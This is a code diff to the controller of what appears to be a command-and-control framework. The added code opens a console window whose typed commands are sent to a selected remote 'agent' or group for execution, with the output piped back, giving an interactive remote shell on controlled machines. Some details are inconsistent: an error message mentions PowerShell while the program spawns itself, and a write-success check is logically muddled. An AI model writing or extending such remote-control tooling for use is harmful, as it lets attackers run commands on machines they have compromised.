@@ -87,6 +87,20 @@ VOID Controller::HandleCommandObject(ControllerCommandReq commandReq)
         ShowMan();
     }
 
+    if (commandType == CommandType::OpenCmdWindow) {
+        std::cout << "[!] CMD command!\n";
+        // validate ip:port / groupname 
+        SendCommand(commandReq);
+        ReceiveData(szOutputBuffer);
+        if (szOutputBuffer != "Found") {
+            std::cout << "[!] Could not find " << commandReq.GetTargetAgent() << commandReq.GetGroupName() << "\n";
+        }
+        else {
+            szOutputBuffer = "C:\\>";
+            arrWindowSessionThreads.emplace_back(&Controller::OpenSessionWindow, this, commandReq, szOutputBuffer);
+        }
+    }
+
     if (commandType == CommandType::Man) {
         ShowMan();
     }
@@ -123,7 +137,106 @@ BOOL Controller::ReceiveData(std::string& szOutBuffer) {
     }
 
     return FALSE;
- }
+}
+
+VOID Controller::OpenSessionWindow(ControllerCommandReq commandReq, std::string szInitialCwd)
+{
+    BOOL bIsChildCreated;
+    CHAR carrSelfPath[MAX_PATH];
+    HANDLE hChildStdoutRead;
+    HANDLE hChildStdoutWrite;
+    HANDLE hChildStdinRead;
+    HANDLE hChildStdinWrite;
+    std::string szWindowCommand;
+    std::string szCommandOutput;
+    std::string szProcessCommandLine;
+    STARTUPINFOA siStartInfo{};
+    SECURITY_ATTRIBUTES saAttr{};
+    PROCESS_INFORMATION piProcInfo{};
+
+    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
+    saAttr.bInheritHandle = TRUE;
+    saAttr.lpSecurityDescriptor = NULL;
+
+    // Create pipes for stdout
+    CreatePipe(&hChildStdoutRead, &hChildStdoutWrite, &saAttr, 0);
+    SetHandleInformation(hChildStdoutRead, HANDLE_FLAG_INHERIT, 0);
+
+    // Create pipes for stdin
+    CreatePipe(&hChildStdinRead, &hChildStdinWrite, &saAttr, 0);
+    SetHandleInformation(hChildStdinWrite, HANDLE_FLAG_INHERIT, 0);
+
+    // Set up the process startup info
+    siStartInfo.cb = sizeof(STARTUPINFOA);
+    siStartInfo.hStdError = hChildStdoutWrite;
+    siStartInfo.hStdOutput = hChildStdoutWrite;
+    siStartInfo.hStdInput = hChildStdinRead;
+    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;
+
+    // Create child process
+    GetModuleFileNameA(NULL, carrSelfPath, MAX_PATH);
+    szProcessCommandLine = std::string(carrSelfPath) + " " + CHILD_PROCESS_FLAG;
+    bIsChildCreated = CreateProcessA(
+        NULL,
+        &szProcessCommandLine[0],
+        NULL,
+        NULL,
+        TRUE,
+        CREATE_NEW_CONSOLE,
+        NULL,
+        NULL,
+        &siStartInfo,
+        &piProcInfo
+    );
+
+    if (!bIsChildCreated) {
+        std::cerr << "Failed to start PowerShell.\n";
+        exit(1);
+    }
+
+    // Close unused pipe ends
+    CloseHandle(hChildStdoutWrite);
+    CloseHandle(hChildStdinRead);
+
+    WriteToChild(hChildStdinWrite, szInitialCwd);
+
+    while (bIsRunning) {
+        if (!ReadFromChild(hChildStdoutRead, szWindowCommand)) {
+            break;
+        }
+
+        SendCommand(ControllerCommandReq(CommandType::Execute, commandReq.GetTargetAgent(), commandReq.GetGroupName(), szWindowCommand));
+        ReceiveData(szCommandOutput);
+
+        if (!WriteToChild(hChildStdinWrite, szCommandOutput + "\n" + szInitialCwd)) {
+            break;
+        }
+    }
+}
+
+BOOL Controller::ReadFromChild(HANDLE hChildStdoutRead, std::string& szCommand)
+{
+    BOOL bIsReadSuccess;
+    CHAR carrReadBuffer[4096];
+    DWORD dwBytesRead;
+    bIsReadSuccess = ReadFile(hChildStdoutRead, carrReadBuffer, sizeof(carrReadBuffer) - 1, &dwBytesRead, NULL);
+
+    if (bIsReadSuccess) {
+        carrReadBuffer[dwBytesRead] = '\0';
+        szCommand = std::string(carrReadBuffer);
+    }
+
+    return bIsReadSuccess;
+}
+
+BOOL Controller::WriteToChild(HANDLE hChildStdinWrite, const std::string& szData)
+{
+    BOOL bIsWriteSuccess;
+    DWORD dwBytesWritten;
+    bIsWriteSuccess = WriteFile(hChildStdinWrite, szData.c_str(), szData.length(), &dwBytesWritten, NULL) || dwBytesWritten != szData.length();
+
+    return bIsWriteSuccess;
+}
 
 
 VOID Controller::ShowMan()
@@ -141,3 +254,5 @@ VOID Controller::ShowMan()
     std::cout << "[*] groups - Print all active control groups\n";
     std::cout << "[*] man - Show this man page\n";
 }
+
+
